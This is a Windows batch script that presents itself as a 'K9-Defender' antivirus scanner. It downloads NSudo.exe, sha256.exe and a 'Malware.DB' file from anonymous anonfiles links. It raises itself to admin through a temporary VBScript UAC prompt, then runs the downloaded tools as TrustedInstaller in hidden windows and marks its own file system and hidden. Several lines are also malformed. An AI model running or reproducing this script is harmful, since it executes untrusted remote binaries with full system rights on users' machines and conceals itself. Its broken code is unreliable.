::K91408815
@echo off
setlocal EnableDelayedExpansion
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe', 'NSudo.exe')"
powershell -Command "Invoke-WebRequest https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe -OutFile NSudo.exe"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-130.anonfiles.com/3c5b9eR4x5/6b9359c3-1648479482/Malware.DB', 'Malware.DB')"
powershell -Command "Invoke-WebRequest https://cdn-130.anonfiles.com/3c5b9eR4x5/6b9359c3-1648479482/Malware.DB -OutFile Malware.DB"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-128.anonfiles.com/t16292Rdxc/1fc5ded2-1648479589/sha256.exe', 'sha256.exe')"
powershell -Command "Invoke-WebRequest https://cdn-128.anonfiles.com/t16292Rdxc/1fc5ded2-1648479589/sha256.exe -OutFile sha256.exe"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Seting privileges.
	echo Seting privileges..
    echo Seting privileges...
    echo Requesting administrative privileges.
	echo Requesting administrative privileges..
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "NSudo.exe", " -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide %~s0 %params%' -Verb RunAs", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B f0a23i4

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
ATTRIB /S /D %~nx0 +s +h >nul
	NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide K9-Defender %SystemDrive%\
NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide Scan
NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide DeepScan %SystemDrive%\
NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide cmd /c "sfc /scannow | sfc /VERIFYONLY && sfc /scannow || sfc /VERIFYONLY & echo. Done."
	NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide Sandbox "%SystemRoot%\*.*"
	NSudo -P:E -M:S -Priority:RealTime -U:T -ShowWindowMode:Hide sfc /scannow